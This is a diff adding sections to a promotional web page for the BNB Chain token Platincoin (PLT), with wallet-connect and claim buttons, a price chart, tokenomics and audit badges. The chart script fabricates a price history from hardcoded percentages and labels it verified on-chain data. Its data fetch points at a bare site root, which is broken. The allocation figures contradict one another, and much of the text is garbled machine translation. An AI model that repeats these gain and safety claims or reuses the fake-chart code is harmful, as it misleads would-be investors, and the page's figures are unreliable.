+    89,85 % de l'offre totale (9 883 500 PLT) est verrouillée dans le contrat intelligent en chaîne Mining Vault pour la distribution de preuve de travail du processeur, tandis que la liquidité DEX sur PancakeSwap V2 est verrouillée à 100 % via PinkLock (#2113264) pour protéger les détenteurs et garantir l'intégrité du marché ouvert.
+  </p>
+  <p class="lang-it" style="display:none;margin:0;font-size:13px;line-height:1.6;color:#94a3b8;">
+    89,85 % de l'approvisionnement total (9 883 500 PLT) est détenu dans le contrat intelligent en chaîne Mining Vault pour la distribution de la preuve de travail du processeur minier, ainsi que de la liquidité de PancakeSwap V2 et est bloqué à 100 % par PinkLock (#2113264) sous la protection des propriétaires et de l'intégrité du marché.
+  </p>
+</div>
+
+<!-- SEZIONE WEB3 PORTAL + ROI AFFIANCATI (STILE EXCHANGE) -->
+<div class="flex-layout" style="margin-top: 25px; margin-bottom: 25px;">
+  
+  <!-- PANNELLO DI SINISTRA: PORTALE WEB3 -->
+  <div class="card" style="flex: 1; min-width: 300px; background: #0d1117; border: 1px solid var(--border); padding: 25px; border-radius: 12px; text-align: center; display: flex; flex-direction: column; justify-content: space-between;">
+    <div>
+      <h3 class="lang-en" style="margin-top: 0; color: #ffffff;">Platincoin (PLT) - Portail Web3</h3>
+      <h3 class="lang-it" style="margin-top: 0; color: #ffffff;">Platincoin (PLT) - Portail Web3</h3>
+
+      <button id="connectBtn" style="background-color: #f6851b; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px;">
+      <span class="lang-en">Connecter le portefeuille Web3</span>
+      <span class="lang-it">Portefeuille Connetti Web3</span>
+      </button>
+      
+      <div id="walletAddress" style="margin-top: 10px; color: #00ffcc; font-family: monospace; font-size: 12px;"></div>
+    </div>
+    
+    <div style="margin-top: 20px; border-top: 1px solid #1e293b; padding-top: 20px;">
+      <h4 class="lang-en" style="margin-bottom: 5px; color: #ffffff;">Réclamez votre PLT extrait</h4>
+      <h4 class="lang-it" style="margin-bottom: 5px; color: #ffffff;">Riscatta à ton PLT Minati</h4>
+      <p class="lang-en" style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Solde actuel dans le mineur : <strong id="live-supply-web3">--</strong> PLT</p>
+      <p class="lang-it" style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Saldo attuale nel mineur: <strong id="live-supply-web3-it">--</strong> PLT</p>
+      
+      <button id="claimBtn" disabled style="background-color: #6a1b9a; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: not-allowed; font-weight: bold; width: 100%;">
+        <span class="lang-en">Demander un paiement (réclamer PLT)</span>
+        <span class="lang-it">Paiement Richiedi (réclamation PLT)</span>
+      </button>
+    </div>
+    <div id="statusMessage" style="margin-top: 15px; font-size: 12px; font-weight: bold;"></div>
+<button id="backupBtn" onclick="downloadPaperWallet()" style="background-color: #1e293b; color: #00ffcc; border: 1px solid #00ffcc; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 12px;">
+  <span class="lang-en">💾 Télécharger la Sauvegarde (.txt)</span>
+  <span class="lang-it">💾 Scarica Backup Wallet (.txt)</span>
+<button id="addTokenBtn" onclick="addTokenToWallet()" style="background-color: #0d1117; color: #ffffff; border: 1px solid #334155; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;">
+  <span class="lang-en">💳 Importer PLT vers le Portefeuille Web3</span>
+  <span class="lang-it">💳 Importa PLT nel Wallet Web3</span>
+</button>  
+</div>
+
+  <!-- PANNELLO DI DESTRA: CALCOLATORE ROI -->
+  <div class="card" style="flex: 1; min-width: 300px; background: #0d1117; border: 1px solid var(--border); padding: 25px; border-radius: 12px; display: flex; flex-direction: column; justify-content: space-between;">
+    <div style="padding:4px 0;display:flex;flex-direction:column;justify-content:center;width:100%;"><div style="font-size:11px;font-weight:700;color:#34d399;letter-spacing:0.8px;margin-bottom:10px;">📊 ALLOCATION DE L'OFFRE ON-CHAIN ET COFFRE-FORT</div><div style="font-size:13px;color:#cbd5e1;margin-bottom:14px;">Distribution vérifiable du strict <strong>11 000 000 PLT</strong> approvisionnement fixe sur BNB Smart Chain :</div><div style="margin-bottom:12px;"><div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;font-size:12.5px;margin-bottom:5px;"><span><strong>Réserve du Coffre de Minage</strong></span><span style="color:#34d399;font-weight:700;">89,85% (9 883 500 PLT)</span></div><div style="height:8px;border-radius:6px;background:#090e1a;overflow:hidden;"><div style="width:89.85%;height:100%;background:linear-gradient(90deg,#10b981,#34d399);"></div></div></div><div style="margin-bottom:16px;"><div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;font-size:12.5px;margin-bottom:5px;"><span><strong>Pool LP en Circulation et Verrouillé</strong></span><span style="color:#60a5fa;font-weight:700;">10,15% (1 116 500 PLT)</span></div><div style="height:8px;border-radius:6px;background:#090e1a;overflow:hidden;"><div style="width:10.15%;height:100%;background:#3b82f6;"></div></div></div><div style="padding:10px 12px;border-radius:10px;background:#090e1a;border:1px solid rgba(52,211,153,0.2);font-size:12px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;"><span>État du Minage Public CPU :</span><strong style="color:#fbbf24;">TESTNET FERMÉ (OUVERTURE PROCHAINE)</strong></div></div>
+  
+  <div id="statusMessageSecondary" style="margin-top: 15px; font-weight: bold;"></div>
+</div>
+     
+           <div class="flex-layout">
+            <div class="flex-col-left">
+                <div class="calculator-box" style="padding:20px;display:flex;flex-direction:column;justify-content:space-between;">
+  <table style="width:100%;border-collapse:collapse;margin-bottom:10px;">
+    <tr>
+      <td>
+        <h3 class="lang-en" style="margin:0;">Graphique des prix en direct (PLT / USDT)</h3>
+        <h3 class="lang-it" style="display:none;margin:0;">Grafico Prezzo Live (PLT / USDT)</h3>
+        <span class="lang-en" style="font-size:12px;color:#94a3b8;">PancakeSwap V2 • Historique des échanges en chaîne</span><span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">PancakeSwap V2 • Storico Scambi en chaîne</span>
+      </td>
+      <td style="text-align:right;">
+        <span id="plt-tr-price" style="font-size:18px;font-weight:800;color:#34d399;"><span class="plt-live-val">$0.00974</span></span>
+        <span id="plt-tr-chg" style="display:block;font-size:11px;font-weight:700;color:#34d399;">+409.71% (24h)</span>
+      </td>
+    </tr>
+  </table>
+  <svg id="plt-trade-chart" viewBox="0 0 520 265" style="width:100%;height:265px;border-radius:12px;background:#0a0e1a;border:1px solid rgba(255,255,255,0.08);display:block;"></svg>
+  <table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px;color:#94a3b8;">
+    <tr>
+      <td id="plt-tr-info"><span class="lang-en">Historique vérifié du pool en chaîne • PancakeSwap V2</span><span class="lang-it" style="display:none;">Storico Pool Verificato sur la chaîne • PancakeSwap V2</span></td>
+      <td style="text-align:right;">
+        <a href="https://www.geckoterminal.com/bsc/pools/0xa51e99928c39ae656b7cb38006b8a1d220479b2c" target="_blank" rel="noopener" style="color:#a78bfa;font-weight:700;text-decoration:none;">
+          <span class="lang-en">Terminal complet ↗</span>
+          <span class="lang-it" style="display:none;">Terminale Complète ↗</span>
+        </a>
+      </td>
+    </tr>
+  </table>
+  <script>
+    (function(){
+      const svg=document.getElementById("plt-trade-chart");
+      function draw(pts){
+        const W=520,H=265,pL=16,pR=76,pT=20,pB=28;
+        const vals=pts.map(x=>x.p);
+        let min=Math.min(...vals),max=Math.max(...vals);
+        if(max<=min){min*=0.95;max*=1.05;}
+        const pad=(max-min)*0.1;min=Math.max(0.00001,min-pad);max+=pad;
+        const xOf=i=>pL+(W-pL-pR)*(i/(pts.length-1||1));
+        const yOf=v=>pT+(H-pT-pB)*(1-(v-min)/(max-min));
+        let s='<defs><linearGradient id="pltArea" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#10b981" stop-opacity="0.35"/><stop offset="100%" stop-color="#10b981" stop-opacity="0.0"/></linearGradient></defs>';
+        for(let i=0;i<=4;i++){
+          const val=min+(max-min)*(i/4),y=yOf(val).toFixed(1);
+          s+='<line x1="'+pL+'" y1="'+y+'" x2="'+(W-pR)+'" y2="'+y+'" stroke="rgba(255,255,255,0.06)" stroke-width="1"/>';
+          s+='<text x="'+(W-pR+6)+'" y="'+(Number(y)+4)+'" fill="#64748b" font-size="10" font-family="monospace">$'+val.toFixed(5)+'</text>';
+        }
+        let dLine="",dArea="";
+        pts.forEach((pt,i)=>{
+          const x=xOf(i).toFixed(1),y=yOf(pt.p).toFixed(1);
+          dLine+=(i?" L ":"M ")+x+" "+y;
+          dArea+=(i?" L ":"M ")+x+" "+y;
+        });
+        dArea+=" L "+xOf(pts.length-1).toFixed(1)+" "+(H-pB)+" L "+xOf(0).toFixed(1)+" "+(H-pB)+" Z";
+        s+='<path d="'+dArea+'" fill="url(#pltArea)"/>';
+        s+='<path d="'+dLine+'" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linejoin="round" stroke-linecap="round"/>';
+        pts.forEach((pt,i)=>{
+          const x=xOf(i).toFixed(1),y=yOf(pt.p).toFixed(1);
+          const col=pt.kind==="sell"?"#ef4444":"#10b981";
+          s+='<circle cx="'+x+'" cy="'+y+'" r="3.5" fill="'+col+'" stroke="#0a0e1a" stroke-width="1.2"/>';
+        });
+        [0,Math.floor((pts.length-1)/2),pts.length-1].forEach((idx,k)=>{
+          if(!pts[idx])return;
+          const anchor=k===0?"start":(k===2?"end":"middle");
+          s+='<text x="'+xOf(idx).toFixed(1)+'" y="'+(H-8)+'" text-anchor="'+anchor+'" fill="#64748b" font-size="10" font-family="sans-serif">'+pts[idx].t+'</text>';
+        });
+        svg.innerHTML=s;
+      }
+      function fallbackCurve(liveP,pc){
+        const p24=liveP/(1+(Number(pc.h24||409.71)/100));
+        const p6=liveP/(1+(Number(pc.h6||140)/100));
+        const p1=liveP/(1+(Number(pc.h1||20)/100));
+        const p5=liveP/(1+(Number(pc.m5||0)/100));
+        return [
+          {p:p24*0.95,kind:"buy",t:"Genesis"},
+          {p:p24,kind:"buy",t:"24h ago"},
+          {p:(p24+p6)/2,kind:"buy",t:"14h ago"},
+          {p:p6,kind:"buy",t:"6h ago"},
+          {p:(p6+p1)/2,kind:"buy",t:"3h ago"},
+          {p:p1,kind:"buy",t:"1h ago"},
+          {p:p5,kind:"buy",t:"5m ago"},
+          {p:liveP,kind:"buy",t:"Live"}
+        ];
+      }
+      draw(fallbackCurve(0.009148,{h24:409.71,h6:140,h1:20,m5:0}));
+      const pool="https://geckoterminal.com";
+      fetch(pool).then(r=>r.json()).then(pData=>{
+        const attr=pData&&pData.data&&pData.data.attributes;
+        if(!attr||!attr.base_token_price_usd)return;
+        const liveP=Number(attr.base_token_price_usd);
+        document.getElementById("plt-tr-price").textContent="$"+liveP.toFixed(6);
+        if(attr.price_change_percentage&&attr.price_change_percentage.h24){
+          const c=Number(attr.price_change_percentage.h24),el=document.getElementById("plt-tr-chg");
+          el.textContent=(c>=0?"+":"")+c.toFixed(2)+"% (24h)";el.style.color=c>=0?"#34d399":"#f87171";
+        }
+        draw(fallbackCurve(liveP,attr.price_change_percentage||{}));
+        return fetch(pool+"/trades").then(r=>r.json()).then(tData=>{
+          const trades=(tData&&tData.data)||[];
+          const pts=trades.slice().reverse().map(tr=>{
+            const a=tr.attributes||{};
+            const p1=Number(a.price_to_in_usd||0),p2=Number(a.price_from_in_usd||0);
+            const pr=(p1>0&&p1<1)?p1:((p2>0&&p2<1)?p2:0);
+            const dt=a.block_timestamp?new Date(a.block_timestamp):new Date();
+            const lbl=dt.toLocaleDateString([],{month:"short",day:"numeric"})+" "+dt.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"});
+            return {p:pr,kind:a.kind||"buy",t:lbl};
+          }).filter(x=>x.p>0);
+          if(pts.length>=2){
+            draw(pts);
+            document.getElementById("plt-tr-info").innerHTML="<span class=\"lang-en\">"+pts.length+" Verified On-Chain Swaps • PancakeSwap V2</span><span class=\"lang-it\" style=\"display:none;\">"+pts.length+" Scambi Verificati On-Chain • PancakeSwap V2</span>";if(typeof switchLang==="function"&&document.documentElement.lang==="it")switchLang("it");
+          }
+        });
+      }).catch(()=>{});
+    })();
+  </script>
+</div>
+</div>
+            <div class="flex-col-right">
+                <div class="buy-step">
+                    <div style="display:flex;flex-direction:column;gap:12px;">
+  <div style="padding:14px 16px;border-radius:14px;background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.28);display:flex;justify-content:space-between;align-items:center;gap:10px;">
+    <div><strong style="font-size:13.5px;color:#f8fafc;">Contrat Intelligent et Audit 0 % Taxe</strong><div style="font-size:12px;color:#94a3b8;margin-top:2px;">Contrat BEP-20 vérifié open source sur BNB Smart Chain</div></div>
+    <span style="padding:4px 10px;border-radius:8px;background:rgba(52,211,153,0.15);color:#34d399;font-size:11px;font-weight:700;white-space:nowrap;">✓ VÉRIFIÉ</span>
+  </div>
+  <div style="padding:14px 16px;border-radius:14px;background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.28);display:flex;justify-content:space-between;align-items:center;gap:10px;">
+    <div><strong style="font-size:13.5px;color:#f8fafc;">Verrouillage de Liquidité 1 An (PinkLock)</strong><div style="font-size:12px;color:#94a3b8;margin-top:2px;">PancakeSwap V2 PLT/USDT LP verrouillé sous l'ID #2113264</div></div>
+    <span style="padding:4px 10px;border-radius:8px;background:rgba(52,211,153,0.15);color:#34d399;font-size:11px;font-weight:700;white-space:nowrap;">🔒 VERROUILLÉ</span>
+  </div>
+  <div style="padding:14px 16px;border-radius:14px;background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.28);display:flex;justify-content:space-between;align-items:center;gap:10px;">
+    <div><strong style="font-size:13.5px;color:#f8fafc;">Indexation du Marché et Synchronisation de l'Explorateur</strong><div style="font-size:12px;color:#94a3b8;margin-top:2px;">En direct sur GeckoTerminal & FreshCoins • BscScan & DEXView en revue</div></div>
+    <a href="explorer-fr.html" style="padding:5px 10px;border-radius:8px;background:rgba(52,211,153,0.15);color:#34d399;font-size:11px;font-weight:700;text-decoration:none;white-space:nowrap;">Explorateur ↗</a>
+  </div>
+</div>
+            </div>
+        </div>
+        
+        
+
+    <!-- FOOTER UFFICIALE E AVVISO SICUREZZA -->
+    <!-- LIVE MARKET & TOKENOMICS SECTION -->
+<section id="plt-tokenomics-showcase" style="max-width:960px;margin:28px auto;padding:24px;border-radius:18px;background:linear-gradient(145deg,rgba(20,24,38,0.95),rgba(12,15,25,0.98));border:1px solid rgba(124,92,255,0.35);box-shadow:0 12px 35px rgba(0,0,0,0.45);color:#f1f5f9;font-family:inherit;">
+  <table style="width:100%;border-collapse:collapse;margin-bottom:18px;">
+    <tr>
+      <td style="vertical-align:middle;">
+        <span style="display:inline-block;padding:4px 10px;border-radius:999px;background:rgba(16,185,129,0.15);color:#34d399;font-size:12px;font-weight:700;">
+          <span class="lang-en">● DONNÉES DU MARCHÉ BSC EN DIRECT</span>
+          <span class="lang-it" style="display:none;">● DATI DI MERCATO BSC IN TEMPO REALE</span>
+        </span>
+        <h2 class="lang-en" style="margin:8px 0 4px;font-size:22px;color:#fff;">Platincoin ($PLT) — Marché et Tokenomics</h2>
+        <h2 class="lang-it" style="display:none;margin:8px 0 4px;font-size:22px;color:#fff;">Platincoin ($PLT) — Marché et Tokenomics</h2>
+        <p class="lang-en" style="margin:0;font-size:13px;color:#94a3b8;">Métriques en temps réel du pool PancakeSwap V2 vérifié (PLT / USDT)</p>
+        <p class="lang-it" style="display:none;margin:0;font-size:13px;color:#94a3b8;">Metriche en direct de la piscine vérifiée PancakeSwap V2 (PLT / USDT)</p>
+      </td>
+      <td style="text-align:right;vertical-align:middle;">
+        <a href="https://pancakeswap.finance/swap?outputCurrency=0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8&inputCurrency=0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener" style="display:inline-block;padding:12px 20px;border-radius:12px;background:linear-gradient(135deg,#7c5cff,#4f46e5);color:#fff;font-weight:700;font-size:14px;text-decoration:none;">
+          <span class="lang-en">Achetez $ PLT sur PancakeSwap ↗</span>
+          <span class="lang-it" style="display:none;">Achetez $PLT sur PancakeSwap ↗</span>
+        </a>
+      </td>
+    </tr>
+  </table>
+  <table style="width:100%;border-collapse:separate;border-spacing:12px 0;margin:0 -12px 20px;">
+    <tr>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Prix ​​​​en direct (USD)</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Prix ​​​​en direct (USD)</span>
+        <span id="tk-live-price" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;"><span class="plt-live-val">$0.00974</span></span>
+        <span id="tk-live-change" style="display:block;font-size:12px;font-weight:700;color:#34d399;margin-top:2px;">+409.71% (24h)</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Liquidité du pool</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Pool de Liquidité</span>
+        <span id="tk-live-liq" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">$103.50</span>
+        <span class="lang-en" style="display:block;font-size:12px;color:#38bdf8;margin-top:2px;">15 050,87 PLT Ajoutés • 100% Verrouillé</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#38bdf8;margin-top:2px;">15.050,87 PLT Versati • 100% Bloccati</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Offre totale fixe</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Fourniture Totale Fissa</span>
+        <span style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">11 000 000</span>
+        <span class="lang-en" style="display:block;font-size:12px;color:#a78bfa;margin-top:2px;">0% Taxe Achat / 0% Vente</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#a78bfa;margin-top:2px;">0% Tasse Acquisto / Vendita</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Volume des échanges sur 24 heures</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Volume Scambi 24h</span>
+        <span id="tk-live-vol" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">$82.77</span>
+        <span style="display:block;font-size:12px;color:#94a3b8;margin-top:2px;">BEP-20 • Chaîne BNB</span>
+      </td>
+    </tr>
+  </table>
+  <p style="display:flex;justify-content:space-between;font-size:13px;font-weight:600;margin:0 0 8px;">
+    <span>
+      <span class="lang-en">Distribution Tokenomics en chaîne (11 000 000 PLT)</span>
+      <span class="lang-it" style="display:none;">Distribution Tokenomics en chaîne (11 000 000 PLT)</span>
+    </span>
+    <span style="color:#34d399;">
+      <span class="lang-en">Vérifié sur la chaîne</span>
+      <span class="lang-it" style="display:none;">Vérifié sur la chaîne</span>
+    </span>
+  </p>
+  <p style="display:flex;height:14px;border-radius:999px;overflow:hidden;background:#1e293b;margin:0;">
+    <span style="width:89.85%;background:linear-gradient(90deg,#7c5cff,#3b82f6);"></span>
+    <span style="width:8.91%;background:linear-gradient(90deg,#f59e0b,#fbbf24);"></span>
+    <span style="width:0.14%;background:#38bdf8;"></span>
+    <span style="width:1.10%;background:linear-gradient(90deg,#10b981,#34d399);"></span>
+  </p>
+  <p style="display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin:10px 0 16px;font-size:12px;color:#cbd5e1;">
+    <span>🟣 <span class="lang-en"><strong>89,85%</strong> (9,883,500 PLT) — Mining Vault</span><span class="lang-it" style="display:none;"><strong>89,85%</strong> (9.883.500 PLT) — Mining Vault</span></span>
+    <span>🟡 <span class="lang-en"><strong>8,91%</strong> (980,650 PLT) — Founder Treasury</span><span class="lang-it" style="display:none;"><strong>8,91%</strong> (980.650 PLT) — Tesoreria Fondatore</span></span>
+    <span>🔵 <span class="lang-en"><strong>0,13%</strong> (14,549.13 PLT) — Liquidity Wallet</span><span class="lang-it" style="display:none;"><strong>0,13%</strong> (14.549,13 PLT) — Wallet Liquidità</span></span>
+    <span>🟢 <span class="lang-en"><strong>1,10%</strong> (121,300.87 PLT) — Circulating & DEX Pool</span><span class="lang-it" style="display:none;"><strong>1,10%</strong> (121.300,87 PLT) — Circolante & Pool DEX</span></span>
+  </p>
+  <nav style="display:flex;flex-wrap:wrap;gap:10px;">
+    <a href="https://geckoterminal.com/bsc/pools/0xa51e99928c39ae656b7cb38006b8a1d220479b2c" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">📈 <span class="lang-en">GeckoTerminal Graphique en direct ↗</span><span class="lang-it" style="display:none;">Grafico Live GeckoTerminal ↗</span></a>
+    <a href="https://pinksale.finance/pinklock/bsc/record/2113264" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">🔒 <span class="lang-en">Verrou PinkLock LP (#2113264) ↗</span><span class="lang-it" style="display:none;">Certificat de verrouillage PinkLock (#2113264) ↗</span></a>
+    <a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">🔍 <span class="lang-en">Contrat vérifié BscScan ↗</span><span class="lang-it" style="display:none;">Contratto Verificato BscScan ↗</span></a>
+  <button type="button" id="plt-add-wallet-btn" style="padding:8px 14px;border-radius:10px;border:1px solid rgba(234,179,8,0.45);background:rgba(234,179,8,0.12);color:#fde047;font-size:12px;font-weight:700;cursor:pointer;">🦊 <span class="lang-en">Ajouter $PLT au portefeuille</span><span class="lang-it" style="display:none;">Ajouter $PLT au portefeuille</span></button>
+  </nav>
+  <script>
+    fetch("https://geckoterminal.com").then(r=>r.json()).then(x=>{const a=x&&x.data&&x.data.attributes;if(!a)return;if(a.base_token_price_usd)document.getElementById("tk-live-price").textContent="$"+Number(a.base_token_price_usd).toFixed(5);if(document.getElementById("top-live-price"))document.getElementById("top-live-price").textContent="$"+Number(a.base_token_price_usd).toFixed(5);if(a.price_change_percentage&&a.price_change_percentage.h24){const c=Number(a.price_change_percentage.h24),e=document.getElementById("tk-live-change");e.textContent=(c>=0?"+":"")+c.toFixed(2)+"% (24h)";e.style.color=c>=0?"#34d399":"#f87171";}if(a.reserve_in_usd)document.getElementById("tk-live-liq").textContent="$"+Number(a.reserve_in_usd).toFixed(2);if(a.volume_usd&&a.volume_usd.h24)document.getElementById("tk-live-vol").textContent="$"+Number(a.volume_usd.h24).toFixed(2);}).catch(()=>{});
+  </script>
+</section>
+
+<!-- ROADMAP & ON-CHAIN MILESTONES SECTION -->
+
+<div id="onchain-audits-section" style="max-width:1520px;width:96%;margin:16px auto;"><div style="background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.28);border-radius:16px;padding:16px 20px;"><div style="font-size:11px;font-weight:700;color:#34d399;margin-bottom:6px;"><span class="lang-en">🛡️ PREUVE INDÉPENDANTE ET TRANSPARENCE</span><span class="lang-it">🛡️ PROVE INDIPENDENTI E TRASPARENZA</span></div><h2 style="font-size:20px;color:#f8fafc;margin:0 0 16px 0;"><span class="lang-en">Vérification en chaîne et audits publics</span><span class="lang-it">Vérifier les publications en chaîne et en audit</span></h2><div class="plt-mobile-stack" style="display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px;">
+<a href="https://www.pinksale.finance/pinklock/bsc/record/2113264" target="_blank" style="padding:15px;border-radius:12px;background:#090e1a;border:1px solid rgba(52,211,153,0.25);text-decoration:none;color:#e2e8f0;display:block;"><div style="font-size:11px;font-weight:700;color:#34d399;margin-bottom:4px;"><span class="lang-en">🔒 VERROUILLAGE DE LIQUIDITÉ</span><span class="lang-it">🔒 LIQUIDITÀ BLOCCATA</span></div><strong style="font-size:14px;display:block;margin-bottom:4px;"><span class="lang-en">Verrouillage rose #2113264 ↗</span><span class="lang-it">Certificat PinkLock #2113264 ↗</span></strong><span class="lang-en" style="font-size:12px;color:#94a3b8;">100% PancakeSwap V2 PLT/USDT LP verrouillé pendant 1 an.</span><span class="lang-it" style="font-size:12px;color:#94a3b8;">100% de liquidité PancakeSwap V2 bloquée par an.</span></a>
+<a href="https://honeypot.is/?address=0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" style="padding:15px;border-radius:12px;background:#090e1a;border:1px solid rgba(52,211,153,0.25);text-decoration:none;color:#e2e8f0;display:block;"><div style="font-size:11px;font-weight:700;color:#34d399;margin-bottom:4px;"><span class="lang-en">✓ HONEYPOT ET TAXES</span><span class="lang-it">✓ VERIFICA HONEYPOT</span></div><strong style="font-size:14px;display:block;margin-bottom:4px;"><span class="lang-en">0% de taxe d'achat/vente ↗</span><span class="lang-it">0% Tasse Acquisto / Vendita ↗</span></strong><span class="lang-en" style="font-size:12px;color:#94a3b8;">Contrat négociable vérifié sans frais cachés.</span><span class="lang-it" style="font-size:12px;color:#94a3b8;">Contrat vérifié sans commission.</span></a>
+<a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8#code" target="_blank" style="padding:15px;border-radius:12px;background:#090e1a;border:1px solid rgba(52,211,153,0.25);text-decoration:none;color:#e2e8f0;display:block;"><div style="font-size:11px;font-weight:700;color:#34d399;margin-bottom:4px;"><span class="lang-en">📜 CODE SOURCE</span><span class="lang-it">📜 CODICE SORGENTE</span></div><strong style="font-size:14px;display:block;margin-bottom:4px;"><span class="lang-en">BscScan Vérifié ↗</span><span class="lang-it">Vérifié sur BscScan ↗</span></strong><span class="lang-en" style="font-size:12px;color:#94a3b8;">Le bytecode OpenZeppelin BEP-20 correspond à la chaîne.</span><span class="lang-it" style="font-size:12px;color:#94a3b8;">Code OpenZeppelin BEP-20 vérifié en chaîne.</span></a>
+<a href="https://github.com/Platincoin-Protocol/Platincoin-PLT" target="_blank" style="padding:15px;border-radius:12px;background:#090e1a;border:1px solid rgba(52,211,153,0.25);text-decoration:none;color:#e2e8f0;display:block;"><div style="font-size:11px;font-weight:700;color:#34d399;margin-bottom:4px;"><span class="lang-en">⚙️ CODE OUVERT</span><span class="lang-it">⚙️ CODE OUVERT</span></div><strong style="font-size:14px;display:block;margin-bottom:4px;"><span class="lang-en">Protocole GitHub ↗</span><span class="lang-it">Protocole sur GitHub ↗</span></strong><span class="lang-en" style="font-size:12px;color:#94a3b8;">Dépôt public pour Dual SHA-256 et le code du portail.</span><span class="lang-it" style="font-size:12px;color:#94a3b8;">Référentiel public par accord Dual SHA-256.</span></a>
+</div></div></div>
+
+<section id="plt-roadmap-section" style="max-width:960px;margin:24px auto 32px;padding:26px;border-radius:18px;background:linear-gradient(145deg,rgba(20,24,38,0.95),rgba(12,15,25,0.98));border:1px solid rgba(52,211,153,0.3);box-shadow:0 12px 35px rgba(0,0,0,0.45);color:#f1f5f9;font-family:inherit;text-align:left;">
+  <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-bottom:18px;">
+    <div>
+      <span style="display:inline-block;padding:4px 10px;border-radius:999px;background:rgba(124,92,255,0.18);color:#c4b5fd;font-size:12px;font-weight:700;letter-spacing:0.5px;">
+        <span class="lang-en">🗺️ DÉVELOPPEMENT DU PROTOCOLE ET PISTE D'AUDIT</span>
+        <span class="lang-it" style="display:none;">🗺️ SVILUPPO DEL PROTOCOLLO E TRACCIABILITÀ</span>
+      </span>
+      <h2 class="lang-en" style="margin:8px 0 4px;font-size:22px;color:#ffffff;">Platincoin ($PLT) – Feuille de route et jalons en chaîne</h2>
+      <h2 class="lang-it" style="display:none;margin:8px 0 4px;font-size:22px;color:#ffffff;">Platincoin ($PLT) — Feuille de route et suivi en chaîne</h2>
+    </div>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:14px;">
+    <!-- PHASE 1 -->
+    <div style="padding:16px;border-radius:14px;background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.3);">
+      <span style="display:inline-block;font-size:11px;font-weight:800;color:#34d399;margin-bottom:6px;">
+        <span class="lang-en">✅ PHASE 1 • COMPLETED</span>
+        <span class="lang-it" style="display:none;">✅ FASE 1 • COMPLETATA</span>
+      </span>
+      <h3 class="lang-en" style="margin:0 0 8px;font-size:15px;color:#fff;">Genesis et contrats intelligents</h3>
+      <h3 class="lang-it" style="display:none;margin:0 0 8px;font-size:15px;color:#fff;">Genesi et Smart Contract</h3>
+      <p class="lang-en" style="margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Déploiement du BEP-20 avec un plafond fixe de 11 millions, une taxe de swap de 0 % et un approvisionnement de 89,85 % verrouillé dans le contrat Mining Vault.</p>
+      <p class="lang-it" style="display:none;margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Déployez le BEP-20 avec une limite de 11 M, 0 % de tas de scambi et 89,85 % de l'approvisionnement bloqué dans le contrat de Mining Vault.</p>
+    </div>
+
